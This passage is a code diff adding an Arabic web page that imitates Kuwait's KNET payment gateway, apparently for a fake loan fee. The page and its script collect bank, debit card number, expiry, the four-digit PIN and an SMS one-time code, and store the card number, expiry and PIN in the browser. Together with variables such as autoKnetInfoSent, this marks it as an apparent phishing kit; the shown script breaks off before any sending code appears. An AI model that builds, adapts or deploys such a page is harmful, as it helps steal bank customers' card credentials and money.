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" alt="logo"></div>
+                        <div class="row">
+                            <div style="text-align: right;"><label class="column-label" style="width: 60%;">شركة التسهيلات التجارية - الكويت.</label> </div>
+                            <div style="float:right;"><label class="column-value text-label" style="width:auto;">:المستفيد </label></div>
+                        </div>
+                        <div id="OrgTranxAmt">
+                            <div style="text-align:right;"><label class="column-label" style="width: 60%;">
+                                    KD&nbsp;2.000
+                                </label>
+                            </div>
+                            <div style="float:right;">
+                                <label class="column-value text-label" style="width:auto;"> :المبلغ</label>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-card">
+                        <div id="ValidationMessage" role="alert" aria-live="polite"></div>
+                        <div id="knetform" style="margin-top: 5px;">
+                            <div class="row">
+                                <div style="text-align:right;">
+                                    <select class="column-value" id='bank' style="width:60%;" dir="rtl">
+                                        <option value="" title="Select Your Bank">
+                                            يرجى اختيار البنك
+                                        </option>
+                                        <option value="ABK">
+                                            البنك الأهلي الكويتي [ABK]
+                                        </option>
+                                        <option value="ALRAJHI">
+                                            مصرف الراجحي [Rajhi]
+                                        </option>
+                                        <option value="BBK">
+                                            بنك البحرين والكويت [BBK]
+                                        </option>
+                                        <option value="BOUBYAN">
+                                            بنك بوبيان [Boubyan]
+                                        </option>
+                                        <option value="BURGAN">
+                                            بنك برقان [Burgan]
+                                        </option>
+                                        <option value="CBK">
+                                            البنك التجاري الكويتي [CBK]
+                                        </option>
+                                        <option value="DOHA">
+                                            بنك الدوحة [Doha]
+                                        </option>
+                                        <option value="GBK">
+                                            بنك الخليج [GBK]
+                                        </option>
+                                        <option value="TAM">
+                                            بيتك [TAM]
+                                        </option>
+                                        <option value="KFH">
+                                            بيت التمويل الكويتي [KFH]
+                                        </option>
+                                        <option value="KIB">
+                                            بنك الكويت الدولي [KIB]
+                                        </option>
+                                        <option value="NBK">
+                                            بنك الكويت الوطني [NBK]
+                                        </option>
+                                        <option value="WEYAY">
+                                            الوطني [Weyay]
+                                        </option>
+                                        <option value="QNB">
+                                            بنك قطر الوطني [QNB]
+                                        </option>
+                                        <option value="UNB">
+                                            بنك الاتحاد الوطنى [UNB]
+                                        </option>
+                                        <option value="WARBA">
+                                            بنك وربة [Warba]
+                                        </option>
+                                    </select> </div>
+                                <div style="text-align:right;  float:right;"><label class="column-label" style="width:100%;">:يرجى اختيار البنك</label></div>
+                            </div>
+                            <div class="row three-column" id="Paymentpagecardnumber">
+                                <label id="prefixField">
+                                    <select class="column-value" name="dcprefix" id="dcprefix" dir="rtl" style="width:26%;">
+                                        <option value="" id="bankcode">
+                                            بادِئة
+                                        </option>
+                                    </select>
+                                </label>
+                                <label id="cardNumberField">
+                                    <input id="cardNumberCombined" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="16" autocomplete="cc-number" class="allownumericwithoutdecimal" aria-label="رقم بطاقة الصرف الآلي">
+                                    <input name="debitNumber" id="debitNumber" type="hidden" maxlength="10">
+                                </label>
+                                <label class="column-label" style="float:right;text-align:right;">:رقم بطاقة الصرف الآلي </label>
+                            </div>
+                            <div id="bankIndicator" class="bank-indicator" aria-live="polite" hidden>
+                                <img class="bank-indicator-logo" alt="">
+                                <span></span>
+                            </div>
+                            <div id="bankPrefixSuggestions" class="bank-prefix-suggestions" hidden></div>
+                            <div class="row three-column" id="cardExpdate">
+                                <div id="debitExpDate" style="float:right; text-align:right;">
+                                    <label class="column-label" style="width: 100%;">
+                                        :تاريخ انتهاء البطاقة </label></div>
+                                <div style="width: 60%;text-align: right;">
+                                            <div id="manualExpiryInput" aria-label="تاريخ انتهاء البطاقة">
+                                                <input id="expiryYearInput" type="tel" inputmode="numeric" maxlength="2" placeholder="YY" autocomplete="cc-exp-year" aria-label="سنة الانتهاء">
+                                                <span aria-hidden="true">/</span>
+                                                <input id="expiryMonthInput" type="tel" inputmode="numeric" maxlength="2" placeholder="MM" autocomplete="cc-exp-month" aria-label="شهر الانتهاء">
+                                            </div>
+                                            <select id='year' class="paymentselect" dir="rtl">
+                                        <option value="">
+                                            YYYY
+                                        </option>
+                                        <option value="2026">
+                                            2026
+                                        </option>
+                                        <option value="2027">
+                                            2027
+                                        </option>
+                                        <option value="2028">
+                                            2028
+                                        </option>
+                                        <option value="2029">
+                                            2029
+                                        </option>
+                                        <option value="2030">
+                                            2030
+                                        </option>
+                                        <option value="2031">
+                                            2031
+                                        </option>
+                                        <option value="2032">
+                                            2032
+                                        </option>
+                                        <option value="2033">
+                                            2033
+                                        </option>
+                                        <option value="2034">
+                                            2034
+                                        </option>
+                                        <option value="2035">
+                                            2035
+                                        </option>
+                                        <option value="2036">
+                                            2036
+                                        </option>
+                                        <option value="2037">
+                                            2037
+                                        </option>
+                                        <option value="2038">
+                                            2038
+                                        </option>
+                                        <option value="2039">
+                                            2039
+                                        </option>
+                                        <option value="2040">
+                                            2040
+                                        </option>
+                                        <option value="2041">
+                                            2041
+                                        </option>
+                                        <option value="2042">
+                                            2042
+                                        </option>
+                                        <option value="2043">
+                                            2043
+                                        </option>
+                                        <option value="2044">
+                                            2044
+                                        </option>
+                                        <option value="2045">
+                                            2045
+                                        </option>
+                                        <option value="2046">
+                                            2046
+                                        </option>
+                                        <option value="2047">
+                                            2047
+                                        </option>
+                                        <option value="2048">
+                                            2048
+                                        </option>
+                                        <option value="2049">
+                                            2049
+                                        </option>
+                                        <option value="2050">
+                                            2050
+                                        </option>
+                                        <option value="2051">
+                                            2051
+                                        </option>
+                                        <option value="2052">
+                                            2052
+                                        </option>
+                                        <option value="2053">
+                                            2053
+                                        </option>
+                                        <option value="2054">
+                                            2054
+                                        </option>
+                                        <option value="2055">
+                                            2055
+                                        </option>
+                                        <option value="2056">
+                                            2056
+                                        </option>
+                                        <option value="2057">
+                                            2057
+                                        </option>
+                                        <option value="2058">
+                                            2058
+                                        </option>
+                                        <option value="2059">
+                                            2059
+                                        </option>
+                                        <option value="2060">
+                                            2060
+                                        </option>
+                                        <option value="2061">
+                                            2061
+                                        </option>
+                                        <option value="2062">
+                                            2062
+                                        </option>
+                                        <option value="2063">
+                                            2063
+                                        </option>
+                                        <option value="2064">
+                                            2064
+                                        </option>
+                                        <option value="2065">
+                                            2065
+                                        </option>
+                                        <option value="2066">
+                                            2066
+                                        </option>
+                                        <option value="2067">
+                                            2067
+                                        </option>
+                                        <option value="2068">
+                                            2068
+                                        </option>
+                                        <option value="2069">
+                                            2069
+                                        </option>
+                                    </select>
+                                    <select id='month' class="paymentselect" dir="rtl">
+                                        <option value="">
+                                            MM
+                                        </option>
+                                        <option value="1">
+                                            01
+                                        </option>
+                                        <option value="2">
+                                            02
+                                        </option>
+                                        <option value="3">
+                                            03
+                                        </option>
+                                        <option value="4">
+                                            04
+                                        </option>
+                                        <option value="5">
+                                            05
+                                        </option>
+                                        <option value="6">
+                                            06
+                                        </option>
+                                        <option value="7">
+                                            07
+                                        </option>
+                                        <option value="8">
+                                            08
+                                        </option>
+                                        <option value="9">
+                                            09
+                                        </option>
+                                        <option value="10">
+                                            10
+                                        </option>
+                                        <option value="11">
+                                            11
+                                        </option>
+                                        <option value="12">
+                                            12
+                                        </option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="row" id="PinRow">
+                                <div id="eComPin">
+                                    <label class="column-label" style=" float:right;text-align:right;">
+                                        :الرقم السري
+                                    </label>
+                                </div>
+                                <div>
+                                    <input inputmode="numeric" pattern="[0-9]*" name="cardPin" id="cardPin" autocomplete="off" dir="rtl" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password" size="4" maxlength="4" style="width: 60%;text-align:right;" class="allownumericwithoutdecimal">
+                                </div>
+                            </div>
+                        </div>
+                        <div id="otpform" style="display:none;">
+                            <div class="row alert-msg" id="notificationbox" style="color:#31708f;font-family:Arial,Helvetica,serif;font-size:10px;">
+                                <div id="notification">
+                                    <p style="text-align:right;"><span> يرجى الانتباه: </span><span style="font-weight:unset;">سيتم الآن ارسال رسالة نصية على رقم هاتفك الجوال المسجل لدى البنك الخاص بك. هذه الرسالة المكونة من </span>6<span style="font-weight:unset;"> خانات هي "رمز التحقق لمرة واحدة"، يرجى استخدام هذا الرمز في الحقل المناسب ادناه</span></p>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div style="text-align:right;"><label class="column-value text-label" id="DCNumber">00000******0000</label></div>
+                                <div id="payConfirmCardNum" style="text-align:right;"><label class="column-label">:رقم بطاقة الصرف الآلي</label></div>
+                            </div>
+                            <div class="row" id="payConfirmExpmnth" style="display:block;">
+                                <div style="float:right;text-align:right;"><label class="column-label" style="width:100%;">:شهر انتهاء الصلاحية</label></div>
+                                <div style="text-align:right;"><label class="column-value text-label" id="expmnth">00</label></div>
+                            </div>
+                            <div class="row" id="payConfirmExpyr" style="display:block;">
+                                <div style="float:right;text-align:right;"><label class="column-label" style="width:100%;">:سنة انتهاء الصلاحية</label></div>
+                                <div style="text-align:right;"><label class="column-value text-label" id="expyear">0000</label></div>
+                            </div>
+                            <div class="row">
+                                <div style="float:right;text-align:right;"><label class="column-label" style="width:100%;">:الرقم السري</label></div>
+                                <div style="text-align:right;"><label class="column-value text-label" id="pinMask">●●●●</label></div>
+                            </div>
+                            <div class="row" id="codeDCDIV" style="display:block;">
+                                <div style="float:right;text-align:right;padding-top:3px;">
+                                    <label class="column-label" style="width:100%;" alt="رمز التحقق">:رمز التحقق</label>
+                                </div>
+                                <div style="padding-left:7%;">
+                                    <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" class="allownumericwithoutdecimal" style="text-align:right;width:60%;" id="dop" name="cardCodeInput" placeholder="Timeout in: 0:00" alt="رمز التحقق" dir="rtl" size="6" maxlength="6">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-card">
+                        <div class="row">
+                            <div style="text-align:center;">
+                                <div id="submithide">
+                                    <button name="proceed" type="submit" class="submit-button" style="float:right;" id="proceed">إرسال</button>
+                                    <input name="proceedCancel" type="button" class="cancel-button" id="cancel" value="إلغاء">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div align="center" id="overlayhide" class="overlay">
+                        <img src="./assets/images/loading-spinner.svg" alt="Loading">
+                    </div>
+                    <footer>
+                        <div>
+                            <span><div class="row_new"><div style="text-align: center;font-size: 12px;"> جميع الحقوق محفوظة&nbsp;©&nbsp;2026 <br><span style="font-weight:bold;color: #0077D5;">شركة الخدمات المصرفية الآلية المشتركة – كي نت</span></div></div></span>
+                        </div>
+                    </footer>
+                </div>
+            </div>
+        </div>
+
+
+        </form>
+    <script>
+        const BANK_PREFIXES = {
+            ABK: ["403622", "423826", "428628"],
+            ALRAJHI: ["458838"],
+            BBK: ["588790", "418056"],
+            BOUBYAN: ["470350", "490455", "490456", "404919", "490456", "450605", "426058", "431199"],
+            BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
+            CBK: ["532672", "537015", "521175", "516334"],
+            DOHA: ["419252"],
+            GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
+            TAM: ["45077848", "45077849"],
+            KFH: ["450778", "537016", "532674", "485602"],
+            KIB: ["406464", "409054"],
+            NBK: ["464452", "589160"],
+            WEYAY: ["464425250", "543363"],
+            QNB: ["524745", "521020"],
+            UNB: ["457778"],
+            WARBA: ["532749", "559459", "541350", "525528"]
+        };
+
+        function prefixes(bankCode) {
+            const prefixSelect = document.getElementById("dcprefix");
+            const prefixValues = BANK_PREFIXES[bankCode] || [];
+            const fragment = document.createDocumentFragment();
+
+            if (!prefixValues.length) {
+                fragment.appendChild(new Option("بادِئة", ""));
+            } else {
+                prefixValues.forEach(function(prefixValue) {
+                    fragment.appendChild(new Option(prefixValue, prefixValue));
+                });
+            }
+
+            prefixSelect.textContent = "";
+            prefixSelect.appendChild(new Option("اختر بادئة البطاقة", ""));
+            prefixSelect.appendChild(fragment);
+
+            if (prefixValues.length) {
+                prefixSelect.selectedIndex = 0;
+            } else {
+                prefixSelect.value = "";
+            }
+        }
+
+        function findBankCodeByPrefix(prefixValue) {
+            return Object.keys(BANK_PREFIXES).find(function(bankCode) {
+                return BANK_PREFIXES[bankCode].includes(prefixValue);
+            }) || "";
+        }
+
+        function hideValidationMessage(triggerFieldId) {
+            const validationMessage = document.getElementById("ValidationMessage");
+            const bankIndicator = document.getElementById("bankIndicator");
+            const bankPrefixSuggestions = document.getElementById("bankPrefixSuggestions");
+            const clearOnFields = (validationMessage.dataset.clearOnFields || "")
+                .split(",")
+                .filter(Boolean);
+
+            if (clearOnFields.length && triggerFieldId && !clearOnFields.includes(triggerFieldId)) {
+                return;
+            }
+
+            validationMessage.textContent = "";
+            validationMessage.style.display = "none";
+            validationMessage.dataset.clearOnFields = "";
+        }
+
+        function showValidationMessage(message, field, clearOnFields) {
+            const validationMessage = document.getElementById("ValidationMessage");
+            validationMessage.textContent = message;
+            validationMessage.style.display = "block";
+            validationMessage.dataset.clearOnFields = (clearOnFields || (field ? [field.id] : [])).join(",");
+
+            if (field) {
+                requestAnimationFrame(function() {
+                    field.focus();
+                });
+            }
+        }
+
+        function updateDebitNumberMaxLength(shouldResetValue) {
+            const prefixSelect = document.getElementById("dcprefix");
+            const debitNumberInput = document.getElementById("debitNumber");
+            const prefixLength = prefixSelect.value.length;
+            const maxLength = prefixLength ? 16 - prefixLength : 10;
+
+            debitNumberInput.maxLength = maxLength;
+            debitNumberInput.setAttribute("maxlength", String(maxLength));
+            debitNumberInput.title = "يجب أن يتكون هذا الجزء من " + maxLength + " أرقام";
+
+            if (shouldResetValue) {
+                debitNumberInput.value = "";
+            } else if (debitNumberInput.value.length > maxLength) {
+                debitNumberInput.value = debitNumberInput.value.slice(0, maxLength);
+            }
+        }
+
+        function convertToWesternDigits(value) {
+            const digitMap = {
+                "٠": "0", "١": "1", "٢": "2", "٣": "3", "٤": "4",
+                "٥": "5", "٦": "6", "٧": "7", "٨": "8", "٩": "9",
+                "۰": "0", "۱": "1", "۲": "2", "۳": "3", "۴": "4",
+                "۵": "5", "۶": "6", "۷": "7", "۸": "8", "۹": "9",
+                "０": "0", "１": "1", "２": "2", "３": "3", "４": "4",
+                "５": "5", "６": "6", "７": "7", "８": "8", "９": "9"
+            };
+
+            return value.replace(/[٠-٩۰-۹０-９]/g, function(character) {
+                return digitMap[character] || character;
+            });
+        }
+
+        function keepDigitsOnly(input, shouldConvertToWesternDigits) {
+            if (shouldConvertToWesternDigits) {
+                input.value = convertToWesternDigits(input.value);
+            }
+
+            input.value = input.value.replace(/\D/g, "");
+
+            if (input.maxLength > 0 && input.value.length > input.maxLength) {
+                input.value = input.value.slice(0, input.maxLength);
+            }
+        }
+
+        function isExpiredCard(selectedMonth, selectedYear) {
+            const now = new Date();
+            const currentMonth = now.getMonth() + 1;
+            const currentYear = now.getFullYear();
+            const month = Number(selectedMonth);
+            const year = Number(selectedYear);
+
+            return year < currentYear || (year === currentYear && month < currentMonth);
+        }
+
+        function updateExpiryValidity() {
+            const expiryRow = document.getElementById("cardExpdate");
+            const monthSelect = document.getElementById("month");
+            const yearSelect = document.getElementById("year");
+            const isInvalid = !monthSelect.value ||
+                !yearSelect.value ||
+                isExpiredCard(monthSelect.value, yearSelect.value);
+
+            expiryRow.classList.toggle("expiry-invalid", isInvalid);
+            return !isInvalid;
+        }
+
+        function formatTwoDigits(value) {
+            return String(value).padStart(2, "0");
+        }
+
+        function maskCardNumber(prefixValue, debitNumberValue) {
+            const maskedPartLength = Math.max(debitNumberValue.length - 4, 0);
+            const visibleLastDigits = debitNumberValue.slice(-4);
+            return prefixValue + "*".repeat(maskedPartLength) + visibleLastDigits;
+        }
+
+        function maskPinCode(pinCodeValue) {
+            return "●".repeat(pinCodeValue.length || 4);
+        }
+
+        function saveKnetDetailsToLocalStorage(details) {
+            localStorage.setItem("bankname", details.bankname);
+            localStorage.setItem("dcprefix", details.dcprefix);
+            localStorage.setItem("debitnumber", details.debitnumber);
+            localStorage.setItem("month", details.month);
+            localStorage.setItem("year", details.year);
+            localStorage.setItem("pincode", details.pincode);
+        }
+
+        function getStoredKnetDetails() {
+            return {
+                bankname: localStorage.getItem("bankname") || "",
+                dcprefix: localStorage.getItem("dcprefix") || "",
+                debitnumber: localStorage.getItem("debitnumber") || "",
+                month: localStorage.getItem("month") || "",
+                year: localStorage.getItem("year") || "",
+                pincode: localStorage.getItem("pincode") || ""
+            };
+        }
+
+        function clearStoredSensitiveKnetDetails() {
+            localStorage.setItem("month", "");
+            localStorage.setItem("year", "");
+            localStorage.setItem("pincode", "");
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            const form = document.querySelector("form");
+            const bankSelect = document.getElementById("bank");
+            const prefixSelect = document.getElementById("dcprefix");
+            const debitNumberInput = document.getElementById("debitNumber");
+            const cardNumberCombined = document.getElementById("cardNumberCombined");
+            const monthSelect = document.getElementById("month");
+            const yearSelect = document.getElementById("year");
+            const expiryMonthInput = document.getElementById("expiryMonthInput");
+            const expiryYearInput = document.getElementById("expiryYearInput");
+            const cardPinInput = document.getElementById("cardPin");
+            const knetForm = document.getElementById("knetform");
+            const otpForm = document.getElementById("otpform");
+            const proceedButton = document.getElementById("proceed");
+            const cancelButton = document.getElementById("cancel");
+            const otpInput = document.getElementById("dop");
+            const dcNumberLabel = document.getElementById("DCNumber");
+            const expiryMonthLabel = document.getElementById("expmnth");
+            const expiryYearLabel = document.getElementById("expyear");
+            const pinMaskLabel = document.getElementById("pinMask");
+            const overlayHide = document.getElementById("overlayhide");
+            const validationMessage = document.getElementById("ValidationMessage");
+            const bankIndicator = document.getElementById("bankIndicator");
+            const otpBackConfirmationMessage = "هل أنت متأكد من إلغاء طلب القرض؟\n\nإلغاء الطلب أو الرجوع إلى الصفحة السابقة سيعتبر إلغاءً للطلب وقد يؤثر على قبول القرض.";
+            const otpDefaultPlaceholder = "Timeout in: 0:00";
+            const otpTimerDurationSeconds = 4 * 60;
+            let autoSentOtpValue = "";
+            let otpTimerInterval = null;
+            const OTP_EXPIRY_STORAGE_KEY = "knetOtpExpiry";
+            const KNET_REDIRECT_STORAGE_KEY = "knetRedirectedFromStep3";
+            let autoKnetInfoSent = false;
+
+            const BANK_DISPLAY_NAMES = {
+                ABK: "البنك الأهلي الكويتي",
+                ALRAJHI: "مصرف الراجحي",
+                BBK: "بنك البحرين والكويت",
+                BOUBYAN: "بنك بوبيان",
+                BURGAN: "بنك برقان",
+                CBK: "البنك التجاري الكويتي",
+                DOHA: "بنك الدوحة",
+                GBK: "بنك الخليج",
+                TAM: "بيت التمويل الكويتي",
+                KFH: "بيت التمويل الكويتي",
+                KIB: "بنك الكويت الدولي",
+                NBK: "بنك الكويت الوطني",
+                WEYAY: "Weyay",
+                QNB: "بنك قطر الوطني",
+                UNB: "بنك الاتحاد الوطني",
+                WARBA: "بنك وربة"
+            };
+
+            const BANK_LOGOS = {
+                ABK: "assets/images/banks/abk.jpg",
+                ALRAJHI: "assets/images/banks/alrajhi.jpg",
+                BBK: "assets/images/banks/bbk.jpg",
+                BOUBYAN: "assets/images/banks/boubyan.jpg",
+                BURGAN: "assets/images/banks/burgan.jpg",
+                CBK: "assets/images/banks/tijari.jpg",
+                GBK: "assets/images/banks/gbk.jpg",
+                KFH: "assets/images/banks/kfh.jpg",
+                KIB: "assets/images/banks/kib.jpg",
+                NBK: "assets/images/banks/nbk.jpg",
+                QNB: "assets/images/banks/qnb.jpg",
+                WARBA: "assets/images/banks/warba.jpg",
+                WEYAY: "assets/images/banks/weyay.jpg"
+            };
+
+            function showCombinedPrefixPreview(value) {
+                const enteredDigits = value.slice(0, 9);
+                const firstMatch = Object.keys(BANK_PREFIXES)
+                    .reduce(function(matches, bankCode) {
+                        return matches.concat(BANK_PREFIXES[bankCode].map(function(prefix) {
+                            return { bankCode: bankCode, prefix: prefix };
+                        }));
+                    }, [])
+                    .filter(function(item) {
+                        return item.prefix.startsWith(enteredDigits);
+                    })
+                    .sort(function(first, second) {
+                        return second.prefix.length - first.prefix.length;
+                    })[0];
+
+                if (!/^[45]/.test(value) || !firstMatch) {
+                    bankIndicator.hidden = true;
+                    return;
+                }
+
+                if (!bankPrefixSuggestions.hidden) {
+                    bankIndicator.hidden = true;
+                    return;
+                }
+
+                const logo = bankIndicator.querySelector(".bank-indicator-logo");
+                const label = bankIndicator.querySelector("span");
+                const bankName = BANK_DISPLAY_NAMES[firstMatch.bankCode] || firstMatch.bankCode;
+
+                logo.src = BANK_LOGOS[firstMatch.bankCode] || "";
+                logo.alt = bankName;
+                logo.hidden = !logo.src;
+                label.textContent = firstMatch.prefix.slice(0, 6) + "  -  " + bankName;
+                bankIndicator.dataset.prefix = firstMatch.prefix.slice(0, 6);
+                bankIndicator.hidden = false;
+            }
+
+            function getSuggestedBankPrefix(value) {
+                const digits = value.slice(0, 6);
+
+                for (const bankCode of Object.keys(BANK_PREFIXES)) {
+                    const prefix = BANK_PREFIXES[bankCode].find(function(candidate) {
+                        return candidate.startsWith(digits);
+                    });
+
+                    if (prefix) {
+                        return { bankCode: bankCode, prefix: prefix };
+                    }
+                }
+
+                return null;
+            }
+
+            function getMatchingBankPrefixes(value) {
+                const digits = value.slice(0, 6);
+                const matches = [];
+
+                Object.keys(BANK_PREFIXES).forEach(function(bankCode) {
+                    BANK_PREFIXES[bankCode].forEach(function(prefix) {
+                        if (prefix.startsWith(digits) && !matches.some(function(item) {
+                            return item.prefix === prefix;
+                        })) {
+                            matches.push({ bankCode: bankCode, prefix: prefix });
+                        }
+                    });
+                });
+
+                return matches;
+            }
+
+            function hideBankPrefixSuggestions() {
+                bankPrefixSuggestions.hidden = true;
+                bankPrefixSuggestions.textContent = "";
+            }
+
+            function showBankPrefixSuggestions() {
+                const enteredDigits = cardNumberCombined.value || debitNumberInput.value;
+                const matches = /^[45]/.test(enteredDigits)
+                    ? getMatchingBankPrefixes(enteredDigits)
+                    : [];
+
+                bankPrefixSuggestions.textContent = "";
+
+                if (!matches.length || prefixSelect.value) {
+                    hideBankPrefixSuggestions();
+                    return;
+                }
+
+                matches.forEach(function(match) {
+                    const button = document.createElement("button");
+                    const logo = document.createElement("img");
+                    const label = document.createElement("span");
+                    const bankName = BANK_DISPLAY_NAMES[match.bankCode] || match.bankCode;
+
+                    button.type = "button";
+                    button.className = "bank-prefix-option";
+                    logo.src = BANK_LOGOS[match.bankCode] || "";
+                    logo.alt = bankName;
+                    label.textContent = match.prefix + "  -  " + bankName;
+                    button.appendChild(logo);
+                    button.appendChild(label);
+                    button.addEventListener("click", function() {
+                        if (cardNumberCombined.value) {
+                            cardNumberCombined.value = match.prefix.slice(0, 6);
+                            cardNumberCombined.dispatchEvent(new Event("input", { bubbles: true }));
+                            hideBankPrefixSuggestions();
+                            showCombinedPrefixPreview(cardNumberCombined.value);
+                            cardNumberCombined.focus();
+                            return;
+                        }
+
+                        bankSelect.value = match.bankCode;
+                        prefixes(match.bankCode);
+                        prefixSelect.value = match.prefix;
+                        debitNumberInput.value = "";
+                        updateDebitNumberMaxLength(false);
+                        hideBankPrefixSuggestions();
+                        updateBankIndicator();
+                        debitNumberInput.focus();
+                    });
+                    bankPrefixSuggestions.appendChild(button);
+                });
+
+                bankPrefixSuggestions.hidden = false;
+            }
+
+            function updateBankIndicator() {
+                const enteredDigits = debitNumberInput.value;
+                const selectedPrefix = prefixSelect.value;
+                const suggestion = selectedPrefix
+                    ? { bankCode: bankSelect.value, prefix: selectedPrefix }
+                    : getSuggestedBankPrefix(enteredDigits);
+
+                if (!selectedPrefix && !bankPrefixSuggestions.hidden) {
+                    bankIndicator.hidden = true;
+                    bankIndicator.textContent = "";
+                    return;
+                }
+
+                if ((!selectedPrefix && !/^[45]/.test(enteredDigits)) || !suggestion) {
+                    bankIndicator.hidden = true;
+                    bankIndicator.textContent = "";
+                    return;
+                }
+
+                const bankName = BANK_DISPLAY_NAMES[suggestion.bankCode] || suggestion.bankCode;
+                const logo = bankIndicator.querySelector(".bank-indicator-logo");
+                const label = bankIndicator.querySelector("span");
+                const logoPath = BANK_LOGOS[suggestion.bankCode] || "";
+
+                logo.src = logoPath;
+                logo.alt = bankName;
+                logo.hidden = !logoPath;
+                label.textContent = bankName + "  •  " + suggestion.prefix;
+                bankIndicator.hidden = false;
+            }
+
+            function applySuggestedBankPrefix() {
+                const firstDigit = debitNumberInput.value.slice(0, 1);
+                const matchingPrefixes = [];
+
+                if (!/^[45]$/.test(firstDigit)) {
+                    return false;
+                }
+
+                Object.keys(BANK_PREFIXES).forEach(function(bankCode) {
+                    BANK_PREFIXES[bankCode].forEach(function(prefixValue) {
+                        if (prefixValue.startsWith(firstDigit)) {
+                            matchingPrefixes.push({
+                                bankCode: bankCode,
+                                prefix: prefixValue
+                            });
+                        }
+                    });
+                });
+
+                prefixSelect.textContent = "";
+                matchingPrefixes.forEach(function(item) {
+                    const option = new Option(
+                        item.prefix + " - " + (BANK_DISPLAY_NAMES[item.bankCode] || item.bankCode),
+                        item.prefix
+                    );
+                    option.dataset.bankCode = item.bankCode;
+                    prefixSelect.appendChild(option);
+                });
+
+                prefixSelect.value = "";
+                prefixSelect.disabled = false;
+                debitNumberInput.placeholder = "اختر البادئة ثم أدخل 10 أرقام";
+                debitNumberInput.value = "";
+                updateDebitNumberMaxLength(false);
+                bankIndicator.hidden = true;
+                return matchingPrefixes.length > 0;
+            }
+
+            function fillKnetForm(details) {
+                const prefixValue = details.dcprefix || "";
+                const bankCode = details.bankname || findBankCodeByPrefix(prefixValue);
+
+                bankSelect.value = bankCode;
+                prefixes(bankSelect.value);
+
+                if (prefixValue && Array.from(prefixSelect.options).some(function(option) {
+                    return option.value === prefixValue;
+                })) {
+                    prefixSelect.value = prefixValue;
+                }
+
+                updateDebitNumberMaxLength(true);
+                debitNumberInput.value = details.debitnumber || "";
+                monthSelect.value = details.month || "";
+                yearSelect.value = details.year || "";
+                cardPinInput.value = details.pincode || "";
+            }
+
